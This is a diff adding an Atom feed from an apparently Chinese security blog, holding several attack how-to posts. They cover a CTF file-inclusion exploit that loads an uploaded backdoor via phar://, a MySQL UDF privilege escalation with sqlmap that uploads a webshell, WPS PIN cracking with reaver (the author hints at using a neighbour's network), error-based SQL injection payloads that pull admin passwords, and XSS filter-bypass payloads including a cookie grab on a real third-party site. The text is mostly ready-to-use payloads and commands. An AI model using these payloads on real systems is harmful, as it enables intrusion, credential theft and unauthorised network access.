@@ -1,0 +1,637 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Security | My Octopress Blog]]></title>
+  <link href="http://test.ourren.com/categories/security/atom.xml" rel="self"/>
+  <link href="http://test.ourren.com/"/>
+  <updated>2015-03-17T13:59:45-07:00</updated>
+  <id>http://test.ourren.com/</id>
+  <author>
+    <name><![CDATA[Your Name]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Phpar突破文件包含]]></title>
+    <link href="http://test.ourren.com/2015/03/16/phpar%E7%AA%81%E7%A0%B4%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    <updated>2015-03-16T00:00:00-07:00</updated>
+    <id>http://test.ourren.com/2015/03/16/phpar突破文件包含</id>
+    <content type="html"><![CDATA[<p>Codegate CTF中owlur的一点解题技巧，通过测试发现网站有文件包含可以通过<a href="http://php.net/manual/zh/wrappers.php.php">php://filter</a>读取页面源文件，对php://filter不熟悉的可以研究下：</p>
+
+<pre><code>http://x/owlur/index.php?page=php://filter/convert.base64-encode/resource=upload
+http://x/owlur/index.php?page=php://filter/string.rot13/resource=ndex
+</code></pre>
+
+
+<p>其中读取后的内容是经过编码了的，要看源码记得解码，比如rot13可以在Linux下：</p>
+
+<pre><code>cat 1.php | rot13
+</code></pre>
+
+
+<p>而通过源码发现网站存在文件包含漏洞，源文件代码如下：</p>
+
+<pre><code><?php
+$p = $_REQUEST['page'];
+
+if($p == "" || $p == "index")
+{
+$p = "main";
+}
+
+$haq = base64_decode("ICAgICAgICAgICAgICAgICAgIC8tLS0tLS0tLS0KICAgICAgICAgICAgICAgICAgLyAvIC8qKioqKipcCiAgICAgICAgICAgICAgICAgLyAvKioqKi0tICogKlwKICAgICAgLy8oKCg6PDw8PC86KioqKioqKioqM1xYKlwoKDwKICAgICAvWFgvQ1hDJkNHRy8vKiovLS0vLy9YKlZcKiouLmcmCigvVkNDM2dnMC4uLi4uLi4uKi8vWC8vKC8vL1YqQ1wqLi44ODhnZzhnJjNDPAooMyZnRyYuLi4uLi4uLi4uLiouLlhYWC8oKCgvKi5cKi4uLi4uLi5HLzA4ODgzWDxgCi8oPEM4IC4uLi4uLi4uLi4uKi5YWFhYLy8vLzwvLi4qLi4uLi4uLi4uLi4uLi4uM0NeClgvLzw8Ly4uLi4uLi4uLi4uKiZDVlgvLy9WLzw8Ly4qLi4uLi4uLi4uLi4uLi4uOEdDPApYWC9DLzo8L1YuLi4uLi4uLiomM0NWWFZYVlgoPFYqKi4uLi4uLi4uLi4uLi4uLiBnOENeCiAgICBHQy88PC8oLi4uLi44RyYzQ0NWWFhYWFZ+WFYqLi4uLi4uLi4uLi4uLi4uIEM4M1YKICAgICAgIFYvPF48KFg4OCZWLy8oKDw8PDwoKDxePCoqLi4uLi4uLi4uLi4uLi4uWCYmQwogICAgICAgICAgICAgIGA6L0NDVi8oKCg8PCgvVlZWLyouLi4uLi4uLi4uLi4uLigvQyYvCiAgICAgICAgICAgICAgIDw8IF5eKC9WMzNWWC9WQyZYKlZDLi4uLjo8PH48PDwoKFggIGAKICAgICAgICAgICAgICAgVi8oLzwgXiBeXjovWC8oKDw8Xl4tLS1WOn5+PDwoCiAgICAgICAgICAgICAgMyYgICAgICAgICAgICAgICAgICAuXi0vCiAgICAgICAgICAgICAgQyAgL1wgICAgICAgL1wgICAgICAgIHwKICAgICAgICAgICAgIC9DICBcLyAgICAgICBcLyAgICAgICAvLwogUExaIFNUT1AgICAgIDMgICAgICAgICAgICAgICAgICAgIHxcCiAgIEhBQ0tJTkcgICAgQyAgICAgICAgICAgICAgICAgICAvNSoKICAgICAgICAgICAgICBWICAgICAvLS0tLS1cICAgICAgIC8KICAgICAgICAgICAgICBDRyAgfCAgICAgICAgIHwgIDwvLy88CiAgICAgICAgICAgICAgVkdWIHwgICAgICAgICB8IF4oL1g8XgogICAgICAgICAgICAgICAmJjwgIFwtLS0tLS8gIC4oKDwoXgogICAgICAgICAgICAgICAgODMoICAgICAgICAuPCh+YDw8CiAgICAgICAgICAgICAgICAgOFhgICAgICAuPDxeYCBgKCheCiAgICAgICAgICAgICAgICBCQEBDPC5gXl5gICAgICBeKENHJkMoPC5gYAogICAgIENHOEIkQEBAQEBAQEBAJCggICAgICAgICAgXl4oMEBAQEAkODNYPGAKICAgQkBAQEBAQEBAQEBAQEBAQEBAOC8gICAgICAgYDxDJEBAQEBAQEBAQEAkJjwKICBAQEBAQEBAQEBAQEBAQEAkJCRAQEAkJDA4ODhCQEBAQEBAQEBAQEBAQEBAQEBWYAogQEBAQEBAQEBAQEBAQEAkQCQkJCQkJCRAQEBAJCRAQEAkQEBAQEBAQEBAQEBAQEBDYApAQEBAQEBAQEBAQEBAQCRAJCQkJCQkJCQkJCQkJCQkJCQkQEBAQEBAQEBAQEBAQEBAKGAKQEBAQEBAQEBAQEAkQCQkJCQkJCQkJCQkJCQkQEAkJEBAQEBAQEBAQEBAQEBAQEBAQEIK");
+$haq = htmlentities($haq);
+
+if(strstr($p,"..") !== FALSE)
+die("<pre>$haq</pre>&#8221;);
+
+if(stristr($p,&#8221;http&#8221;) !== FALSE)
+die(&#8221;<pre>$haq</pre>&#8221;);
+
+if(stristr($p,&#8221;ftp&#8221;) !== FALSE)
+die(&#8221;<pre>$haq</pre>&#8221;);
+
+if(strlen($p) >= 60)
+die(&#8221;<pre>string > 60
+$haq</pre>&#8221;);
+
+$inc = sprintf(&#8220;%s.php&#8221;,$p);
+
+?>
+<?php
+include($inc);
+?>
+</code></pre>
+
+
+<p>可以发现其实page参数可以控制，然后会在后面加一个包含的文件名后面加一个“.php”进行文件包含。</p>
+
+<p>另外而此程序可以上传图片，而上传时只能上传jpg图片，其实程序只检测了后缀是不是jpg结尾的，同时在另存为时程序会自动重命名：随机字符串*6.jpg，也就是说：</p>
+
+<pre><code>xxxx.jpg ---->randon.jpg
+</code></pre>
+
+
+<p>其实他没有检测该上传文件是否合法，所以原始文件可以上传上去的，只不过后缀给改为.jpg了。因此我们可以上传我们需要的文件，但是怎么进行包含，这个确实很考脑力：</p>
+
+<ul>
+    <li>上传的文件不能直接包含，因为直接包含上传文件会变为：xxx.jpg.php，不能解析，并且传递的长度超过60；</li>
+    <li>不存在截断，因为php版本为：5.5.x；</li>
+    <li>远程包含过滤了http,ftp，因此只能考虑其他协议，大家可能首先会想到data://， php://input,很可惜全部失效；</li>
+</ul>
+
+
+<p>查询PHP手册发现PHP支持如下的<a href="http://php.net/manual/en/wrappers.php">Wrappers</a>：</p>
+
+<ul>
+    <li>file:// — Accessing local filesystem</li>
+    <li>http:// — Accessing HTTP(s) URLs</li>
+    <li>ftp:// — Accessing FTP(s) URLs</li>
+    <li>php:// — Accessing various I/O streams</li>
+    <li>zlib:// — Compression Streams</li>
+    <li>data:// — Data (RFC 2397)</li>
+    <li>glob:// — Find pathnames matching pattern</li>
+    <li>phar:// — PHP Archive</li>
+    <li>ssh2:// — Secure Shell 2</li>
+    <li>rar:// — RAR</li>
+    <li>ogg:// — Audio streams</li>
+    <li>expect:// — Process Interaction Streams</li>
+</ul>
+
+
+<p>排除上面的测试结果只能测试其它的，于是开始测试file://（无效），SMB(本地可行，本地环境不行)，ssh2://(不行)，当时测试了很多环境没搞定，暂时就没搞了。「在这里备注下：发现digitalocean开一个临时的VPS来玩比赛挺好的，随时开关也不怎么费钱，还公网IP」；</p>
+
+<p>后来内部有人提测试下phar://，好吧，厚着脸皮再玩下，其实原来在开发yii2的时候有使用composer这个工具，貌似也是phar的后缀，没怎么注意，一查吓一跳，结果phar是php5.3以后引入的，其实就是一个zip打包的文件，这。。。</p>
+
+<p>果断下载一个backdoor，然后压缩为zip，然后修改后缀为.jpg，上传成功并得到目标文件地址，整个过程可以这样子描述：</p>
+
+<pre><code>phpspy.php->x.php->x.zip->x.jpg->upload->xsssa.jpg
+</code></pre>
+
+
+<p>于是构造路径并通过phar://进行访问，你猜怎么着，居然成功了，顺利得到flag：</p>
+
+<p><a href="http://x/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/O6i51MF.jpg/1">http://x/owlur/index.php?page=phar:///var/www/owlur/owlur-upload-zzzzzz/O6i51MF.jpg/1</a></p>
+
+<p>其中O6i51MF.jpg是一个zip文件，里面有一个1.php的后门。后来听说zip://这样子也可以，so?</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Linux下MySQL Udf 提权]]></title>
+    <link href="http://test.ourren.com/2015/03/10/linux%E4%B8%8Bmysql-udf-%E6%8F%90%E6%9D%83/"/>
+    <updated>2015-03-10T00:00:00-07:00</updated>
+    <id>http://test.ourren.com/2015/03/10/linux下mysql-udf-提权</id>
+    <content type="html"><![CDATA[<p>前几天做一个小竞赛中有一个题目：给定的测试环境登录页面有POST注入漏洞，于是果断操起sqlmap跑数据，无意中发现当前MySQL连接用户为root，于是想到udf提权「虽然Windows下MySQL提权基本上没问题，但是Linux环境下原来一直没成功过。」，最终成功获取root权限「主要问题在于MySQL是以root权限运行」，记录笔记如下，方便以后查阅：</p>
+
+<h3 id="toc_1">具体步骤如下</h3>
+
+
+<ol>
+    <li>找到MySQL插件目录:
+<pre><code>python sqlmap.py -u 'http://xxxx' --sql-shell
+
+show variables like "%plugin%";
+</code></pre>
+</li>
+    <li>利用sqlmap上传 <a href="https://github.com/mysqludf/lib_mysqludf_sys/blob/master/lib_mysqludf_sys.so">lib<em>mysqludf</em>sys</a>到MySQL插件目录;
+<pre><code>python sqlmap.py -u 'http://xxxx' --file-write=/lib_mysqludf_sys 
+--file-dest=/usr/lib/mysql/plugin/
+</code></pre>
+</li>
+    <li>激活存储过程「sys_exec」函数:
+<pre><code>python sqlmap.py -u 'http://xxxx' --sql-shell
+
+CREATE FUNCTION sys_exec RETURNS STRING SONAME lib_mysqludf_sys.so
+
+SELECT * FROM information_schema.routines
+
+sys_exec(id);
+</code></pre>
+</li>
+    <li>也利用sqlmap上传后门程序：
+<pre><code>python sqlmap.py -u 'http://xxx'  --file-write=C:/phpspy.php --file-dest=/var/www/spy.php
+</code></pre>
+</li>
+</ol>
+
+
+<h3 id="toc_2">测试环境</h3>
+
+
+<ul>
+    <li>Linux Ubuntu 11.04 (Natty Narwhal)</li>
+    <li>PHP 5.3.5, Apache 2.2.17</li>
+    <li>MySQL 5.0</li>
+</ul>
+
+
+<h3 id="toc_3">参考资料</h3>
+
+
+<ol>
+    <li>http://forelsec.blogspot.com/2012/08/solving-pwn0s-v2.html</li>
+    <li>https://github.com/mysqludf/lib<em>mysqludf</em>sys</li>
+    <li>https://code.google.com/p/mysql-udf-http/</li>
+</ol>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[无线安全之WPS]]></title>
+    <link href="http://test.ourren.com/2013/11/07/wireless_security_wps/"/>
+    <updated>2013-11-07T00:00:00-08:00</updated>
+    <id>http://test.ourren.com/2013/11/07/wireless_security_wps</id>
+    <content type="html"><![CDATA[<p><img class="aligncenter" alt="wireless_attch_wps" src="http://blog.ourren.com/blog/wireless_attach.jpg" width="500" height="302"></p>
+
+<p>最近在淘宝入手了一套8187芯片主板与14DB平板天线，用我的老爷笔记本做了下测试，结果测试效果还行，邻居的电信带宽速度也不错。</p>
+
+<p>具体涉及的无线安全技术：主要是扫描开放有WPS功能的无线路由器，然后通过开源软件reaver来暴力破解pin码，最后通过pin来得到无线路由器WPA-PSK密码。前面暴力破解时间稍微比较长，后面这个过程可以说是秒杀。</p>
+
+<h3>配置</h3>
+
+
+<p>基本配置就如下所示，出了笔记本电脑外其它就价格也就RMB120块左右。</p>
+
+<p><em>8187 芯片主板</em>
+<em>14DB平板天线</em>
+<em>3米 USB2.0延长线</em>
+<em>安装Linux 系统的笔记本</em></p>
+
+<p>话说14DB的平板天线看起来还是很霸气的，关于事事如意18DB天线也测试了下效果差不多，不知道是不是楼层的问题。</p>
+
+<h3>准备工作</h3>
+
+
+<p>安装驱动和工具(aircrack-ng和reaver)，Ubuntu可以直接APT，其它系统可以需要下载源码安装，不过都很简单。</p>
+
+<p><em>sudo apt-get install aircrack-ng </em>
+<em>sudo apt-get install reaver</em></p>
+
+<h3>破解过程</h3>
+
+
+<p>1、开启网卡的监控模式</p>
+
+<p>sudo airmon-ng start wlan0</p>
+
+<p>2、扫描附近的无线信号</p>
+
+<p>sudo airodump-ng mon0</p>
+
+<p>在这个过程中你会看到很多无线信号，主要观察几个参数 ：PWR(信号强度，越小越好)，MB(需要为54e.)。</p>
+
+<p>BSSID      PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
+68:53:21:E3:30:BE  -1 0 0 0 143 -1 &lt;length: 0>
+BC:D1:77:25:76:84 -47 50 2 0 1 54e WPA2 CCMP PSK fire
+C8:3A:35:55:42:E8 -44 35 0 0 8 54e WPA CCMP PSK Tenda_5542E8
+1C:FA:68:1C:7D:D6 -56 30 0 0 6 54e. WPA2 CCMP PSK hool
+A8:15:4D:83:6A:24 -51 29 5 0 11 54e. WPA2 CCMP PSK show
+F4:EC:38:3D:02:B6 -53 19 0 0 1 54e. WPA2 CCMP PSK</p>
+
+<p>这里特别强调下Tenda路由器可以秒杀，其路由器的MAC前面地址为： C8:3A:35，后面6为是pin的前8位的十六进制。因此只需要复制MAC地址的后6位，然后转为十进制，就可以得到PIN码的前面的数字了。</p>
+
+<p>3、破解PIN码</p>
+
+<p>sudo reaver -i mon0 -b MAC -a -S -vv -d 0 -c 1</p>
+
+<p>知道PIN前面的数字的时候可以用下面这个命令：</p>
+
+<p>sudo reaver -i mon0 -b MAC -a -S -vv -d 0 -c 6 -p 40000</p>
+
+<p>-b 后面跟MAC地址</p>
+
+<p>-c 频道，从扫描结果看</p>
+
+<p>然后就开始破解了，等4个小时左右基本上可以搞定。</p>
+
+<p>附上reaver调整参数的一些小技巧</p>
+
+<p>reaver:</p>
+
+<p>-i 监听后接口名称</p>
+
+<p>-b 目标mac地址</p>
+
+<p>-a 自动检测目标AP最佳配置</p>
+
+<p>-S 使用最小的DH key（可以提高PJ速度）</p>
+
+<p>-vv 显示更多的非严重警告</p>
+
+<p>-d 即delay每穷举一次的闲置时间 预设为1秒</p>
+
+<p>-t 即timeout每次穷举等待反馈的最长时间</p>
+
+<p>-c 指定频道可以方便找到信号</p>
+
+<p> </p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[关于Mysql注入过程中的三种报错方式]]></title>
+    <link href="http://test.ourren.com/2012/11/03/pentest_method_of_mysql_error/"/>
+    <updated>2012-11-03T00:00:00-07:00</updated>
+    <id>http://test.ourren.com/2012/11/03/pentest_method_of_mysql_error</id>
+    <content type="html"><![CDATA[<p>放点原来的笔记，Mysql在执行语句的时候会抛出异常信息信息，而php+mysql架构的网站往往又将错误代码显示在页面上，这样可以通过构造如下三种方法获取特定数据。</p>
+
+<p>实际测试环境：</p>
+
+<p>[code]mysql> show tables;
++&mdash;&mdash;&mdash;&mdash;&mdash;-+
+| Tables_in_test |
++&mdash;&mdash;&mdash;&mdash;&mdash;-+
+| admin          |
+| article        |
++&mdash;&mdash;&mdash;&mdash;&mdash;-+[/code]</p>
+
+<p> </p>
+
+<p>[code]
+mysql> describe admin;
++&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+
+| Field | Type             | Null | Key | Default | Extra          |
++&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+
+| id    | int(10) unsigned | NO   | PRI | NULL    | auto_increment |
+| user  | varchar(50)      | NO   |     | NULL    |                |
+| pass  | varchar(50)      | NO   |     | NULL    |                |
++&mdash;&mdash;-+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+[/code]</p>
+
+<p> </p>
+
+<p>[code]
+mysql> describe article;
++&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+
+| Field   | Type             | Null | Key | Default | Extra          |
++&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+
+| id      | int(10) unsigned | NO   | PRI | NULL    | auto_increment |
+| title   | varchar(50)      | NO   |     | NULL    |                |
+| content | varchar(50)      | NO   |     | NULL    |                |
++&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+&mdash;&mdash;+&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;-+[/code]</p>
+
+<p>1、通过floor报错</p>
+
+<p>可以通过如下一些利用代码</p>
+
+<p>[code]and select 1 from (select count(<em>),concat(version(),floor(rand(0)</em>2))x
+from information_schema.tables group by x)a);[/code]
+[code]and (select count(<em>) from (select 1 union select null union select !1)x
+group by concat((select table_name from information_schema.tables limit 1),
+floor(rand(0)</em>2)));[/code]</p>
+
+<p>举例如下：
+首先进行正常查询：</p>
+
+<p>[code]mysql> select * from article where id = 1;
++&mdash;-+&mdash;&mdash;-+&mdash;&mdash;&mdash;+
+| id | title | content |
++&mdash;-+&mdash;&mdash;-+&mdash;&mdash;&mdash;+
+|  1 | test  | do it   |
++&mdash;-+&mdash;&mdash;-+&mdash;&mdash;&mdash;+[/code]</p>
+
+<p>假如id输入存在注入的话，可以通过如下语句进行报错。</p>
+
+<p>[code]mysql> select * from article where id = 1 and (select 1 from
+(select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);
+ERROR 1062 (23000): Duplicate entry &lsquo;5.1.33-community-log1&rsquo; for key &lsquo;group_key&rsquo;[/code]</p>
+
+<p>可以看到成功爆出了Mysql的版本，如果需要查询其他数据，可以通过修改version()所在位置语句进行查询。
+例如我们需要查询管理员用户名和密码：
+Method1:</p>
+
+<p>[code]mysql> select * from article where id = 1 and (select 1 from
+(select count(<em>),concat((select pass from admin where id =1),floor(rand(0)</em>2))x
+from information_schema.tables group by x)a);
+ERROR 1062 (23000): Duplicate entry &lsquo;admin8881&rsquo; for key &lsquo;group_key&rsquo;[/code]</p>
+
+<p>Method2:</p>
+
+<p>[code]mysql> select * from article where id = 1 and (select count(<em>)
+from (select 1 union select null union select !1)x group by concat((select pass from admin limit 1),
+floor(rand(0)</em>2)));
+ERROR 1062 (23000): Duplicate entry &lsquo;admin8881&rsquo; for key &lsquo;group_key&rsquo;[/code]</p>
+
+<p>2、ExtractValue
+测试语句如下</p>
+
+<p>[code]and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));[/code]</p>
+
+<p>实际测试过程</p>
+
+<p>[code]mysql> select * from article where id = 1 and extractvalue(1, concat(0x5c,
+(select pass from admin limit 1)));&ndash;
+ERROR 1105 (HY000): XPATH syntax error: &lsquo;\admin888&rsquo;[/code]</p>
+
+<p>3、UpdateXml
+测试语句</p>
+
+<p>[code]and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1))[/code]</p>
+
+<p>实际测试过程</p>
+
+<p>[code]mysql> select * from article where id = 1 and 1=(updatexml(1,concat(0x5e24,
+(select pass from admin limit 1),0x5e24),1));
+ERROR 1105 (HY000): XPATH syntax error: &lsquo;^$admin888^$&rsquo;[/code]</p>
+
+<p>All, thanks foreign guys.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[跨站测试与利用中的绕过技术]]></title>
+    <link href="http://test.ourren.com/2012/09/03/xss_bypass_technology/"/>
+    <updated>2012-09-03T00:00:00-07:00</updated>
+    <id>http://test.ourren.com/2012/09/03/xss_bypass_technology</id>
+    <content type="html"><![CDATA[<h2>1.1 bypass Char</h2>
+
+
+<p>通常有安全意识的程序员往往会对输入进行一定的过滤，比较常见的是针对某一关键符号进行过滤，比如“&lt;”或者“>”，这种方式很多时候是无法防止攻击的，更安全的方式是通过编程语言提供的函数在输出的时候进行过滤。</p>
+
+<p>本节主要针对单字符过滤进行研究，分为引号、尖括号、括号这三个符号进行研究。</p>
+
+<h3>1.1.1 引号</h3>
+
+
+<p>在跨站测试中很多的vector(即攻击向量)本身是不包含引号的，例如下面的一些vector。但是在利用中经常需要使用引号，如果对引号进行了过滤，可以采取如下措施进行绕过。
+[code lang=&ldquo;javascript&rdquo;]
+vector:</p>
+
+<script>alert(/ourren_demo/)</script>
+
+
+<p>&lt;iframe/onload=alert(/ourren_demo/)>
+<img src=x onerror=alert(/ourren_demo/)>
+<p onmouseover=alert(/ourren_demo/)>ourren_demo here.</p>
+[/code]
+<strong>1)String.fromCharCode</strong></p>
+
+<p>fromCharCode可以对利用代码中的引号进行编码处理，但是需要利用eval函数结合进行使用，例如:
+[code lang=&ldquo;javascript&rdquo;]
+<script>alert(&lsquo;ourren_demo&rsquo;)</script>
+&mdash;&ndash;>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,39,105,110,115,105,103,104,116,45,108,97,98,115,39,41))</script>
+[/code]
+<strong>2)location.hash</strong></p>
+
+<p>将带有引号的内容放在location.hash中，其实这个也可以突破跨站长度的控制。
+[code lang=&ldquo;javascript&rdquo;]
+<script>eval(location.hash.slice(1))</script>#alert(&lsquo;a&rsquo;)[/code]
+<h3>1.1.2 尖括号</h3>
+通常程序员为了偷懒都只会过滤尖括号，因此尖括号在跨站过滤中遇到情况最多。一般情况下如果输入没有显示在其他标签里，那么基本上是没有办法进行攻击的，但是如果是输出到其他标签里，则可以结合上下标签进行如下测试：</p>
+
+<p><strong>1</strong><strong>）事件函数</strong></p>
+
+<p>常用的一些事件函数有：onerror、onmouseover、onload等(同时可以关注下HTML5新标签)，需要的时候可以对JavaScript的事件函数进行fuzz。
+[code lang=&ldquo;javascript&rdquo;]
+ <img src=x onerror=alert(/ourren_demo/)>
+ <p onmouseover=alert(/ourren_demo/)>ourren_demo here.</p>
+ <frameset onload=alert(/ourren_demo/)>
+ <body onload=alert(/ourren_demo/)>[/code]</p>
+
+<p><strong>2)style</strong><strong>与expression</strong></p>
+
+<p>通过标签的style样式进行跨站(测试中只有IE成功，同时还得考虑filter问题)。
+[code lang=&ldquo;javascript&rdquo;]
+<div style="width:expression(alert('ourren_demo'));">  [/code]</p>
+
+<p><strong>3)</strong> <strong>JavaScript</strong><strong>伪协议</strong></p>
+
+<p>JavaScript伪协议进行绕过。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+ <img src=javascript:alert('ourren_demo')> （仅IE)  [/code]
+<h3>1.1.3 括号</h3>
+如果测试中发现括号被过滤了，或者无法注入括号，可以进行如下测试：</p>
+
+<p>1）外部文件</p>
+
+<p>通过src引入外部文件，而利用代码放在外部文件中（其中外部文件的后缀可以不为js）。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+<script src='1.js'></script>
+<script src='2.jpg'></script>
+[/code]</p>
+
+<p>2）hex、dec编码</p>
+
+<p>利用十六进制与十进制进行编码。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+<div style="&#119&#105&#100&#116&#104&#58&#101&#120&#112&#114&#101&#115&#115&#105&#111&#110&#40&#97
+&#108&#101&#114&#116&#40&#39&#120&#115&#115&#101&#114&#39&#41&#41">xsser</div>
+[/code]
+<h2>1.2 bypass filter</h2>
+针对跨站问题日益严重，浏览器厂商从自身浏览器安全出发推出了各自的跨站过滤器。但是这类过滤器基本上只支持反射型跨站，其他类型跨站基本不受影响。</p>
+
+<p>各种浏览器采用的防御机制各不相同。反射型跨站防御方面：Firefox基本没什么防御，而IE和chrome都有各自的防御机制，并且都很难绕过，这里主要总结下现有的一些可以绕过机制。
+<h3>1.2.1 IE Filter</h3>
+IE从IE7就支持XSS Filter，其整体架构可见参考文献1，正则匹配部分可以参见文献2。实际处理步骤可分为三步：首先对IE进行启发式过滤（heuristic filters，正则匹配）；如果在HTTP请求中匹配到这些特征，那么就做一个动态签名（create dynamic signature）；如果在HTTP响应中有原来的签名，那么就进行替换修改（neuter response）。在IE全补丁下进行测试，现有公布的绕过技术基本上很少，先总结如下：</p>
+
+<p><strong>1</strong><strong>）<a href=></strong></p>
+
+<p>针对普通的反射型跨站，可以利用A标签和“sc%0aript”实现绕过，不过需要用户交互，这里需要美工师咯。其实原理是页面输出后这两个页面属于同一域，因此不会产生过滤。如果href里面的地址是不同域就会产生过滤。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+<a href="xss.php?a=<sc%0aript>alert(/ourren_demo/)</script>&ldquo;>
+<a href="xss.php?a=<sc%0aript>alert(/ourren_demo/)</script>&rdquo;>
+<div style="position: absolute; left: 0px; top: 0px; height: 1000px; width: 1000px;
+padding: 1em;background:black;text-align: center;">click to continue</div></a>
+[/code]</p>
+
+<p><strong>2</strong><strong>）utf7</strong></p>
+
+<p>通过UTF7-BOM实现注入代码，全补丁情况下只有当header里编码为utf-7才能成功，可以参考文献3。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+%2BACIAPgA8-script%2BAD4-alert%28/ourren_demo/%29%2BADw-%2Fscript%2BAD4APAAi-&amp;oe=Windows-31J
+[/code]</p>
+
+<p><strong>3) Flash</strong></p>
+
+<p>在 <a href="http://blog.ourren.com">www.B.com</a>域名下用iframe嵌入<a href="http://blog.ourren.com">www.A.com</a>的flash XSS文件。当受害者打开了<a href="http://blog.ourren.com">www.B.com</a>的域名时，我们可以成功获取其在<a href="http://blog.ourren.com">www.A.com</a>的cookies数据，参见文献8。</p>
+
+<p>测试代码如下(IE)：</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+&lt;iframe/src=&ldquo;<a href="http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=">http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=</a>
+(function(){location.href=%22javascript:&lsquo;<script>alert(document.cookie)</script>&rsquo;%22})()&rdquo;></iframe>
+[/code]</p>
+
+<p>在chrome中，可能会导致浏览器崩溃，可以改用以下代码。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+&lt;iframe/src=&ldquo;<a href="http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=">http://data.house.sina.com.cn/images/price_trend/open-flash-chart.swf?get-data=</a>
+(function(){alert(document.cookie)})()&rdquo;></iframe>
+[/code]
+<h3>1.2.2 chrome filter</h3>
+chrome浏览器针对xss过滤规则跟IE有比较大的区别，不同版本的chrome测试也会不同，现有的资料可以参考文献4、5。</p>
+
+<p><strong>1）  </strong><strong>data</strong><strong>协议</strong></p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+?vuln=<a href="javascript:alert(document.cookie);">click</a> //会拦截
+&ndash;>转换成  <a href="javascript:void(0)">click</a>
+//bypass
+?vuln=<a href="data:text/html;
+base64,PHNjcmlwdD5hbGVydCgnSGVsbG8gd29ybGQhJyk8L3NjcmlwdD4=
+">click<a>
+->OK
+[/code]</p>
+
+<p><h2>1.3 bypass richtext</h2>
+富文本常见类别有留言，日志或者邮件等。与一般的跨站相比它可以使用现有的标签进行测试分析。一般过滤机制分为两种：黑名单、白名单，这两类机制实质都是基于正则匹配进行过滤，因此在测试过程中需要对比输入和输出，然后进行针对性变化。</p>
+
+<p>常见测试流程：输入常见标签和事件&mdash;&mdash;>是否有存在的标签没有过滤&mdash;&mdash;->变形或者分析其属性</p>
+
+<p>标签：<em>object, applet, base, link, meta, import, embed, vmlframe, iframe, script, style, isindex, form</em><em>，</em><em>textarea</em><em>，</em></p>
+
+<p>字符：<em>javascript:, vbscript: </em></p>
+
+<p>事件：<em>onload,onerror,on*</em>
+<h3>1.3.1 绕过规则</h3>
+本小节将一些常见的一些变化规则进行了归类，实际测试中结合多种方式进行组合测试。</p>
+
+<p><strong> 1</strong><strong>）未递归过滤</strong></p>
+
+<p>很多富文本过滤都是针对关键字过滤，但是没有进行递归过滤，导致过滤后的结果重新组成新的标签，例如：</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+&lt;ifra<iframe>me>之&mdash;&mdash;过滤&mdash;&mdash;<iframe>&mdash;&mdash;&mdash;-<iframe>
+&lt;s<script></script>cript>&mdash;&ndash;过滤&mdash;<script>&mdash;&mdash;&mdash;-<script></script>
+[/code]
+<strong>2)</strong><strong>编码</strong></p>
+
+<p>利用字符的十六进制和十进制编码进行绕过关键字。由于expression只有IE能执行，因此仅限于IE。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
+ <div style="width:expression(alert(/ourren_demo/))">ourren_demo</div><br/>
+<div style="width:\0065xpression(alert(/ourren_demo/))">ourren_demo</div>
+//两次不同类型编码
+<div style="width:\0065xpressio\6e(alert(/ourren_demo/))">ourren_demo</div><br/>
+<div style="&#119&#105&#100&#116&#104&#58&#101&#120&#112&#114&#101&#115&#115&#105&#111&#110
+&#40&#97&#108&#101&#114&#116&#40&#39&#120&#115&#115&#101&#114&#39&#41&#41">xsser</div>
+[/code]</p>
+
+<p><strong>3)</strong><strong>特殊字符</strong></p>
+
+<p>在构造的vector中可以插入tab、换行、等其他空白字符或者&#8221;/**&ldquo;绕过关键字匹配，基本上也只限于IE。</p>
+
+<p>[code lang=&ldquo;javascript&rdquo;]
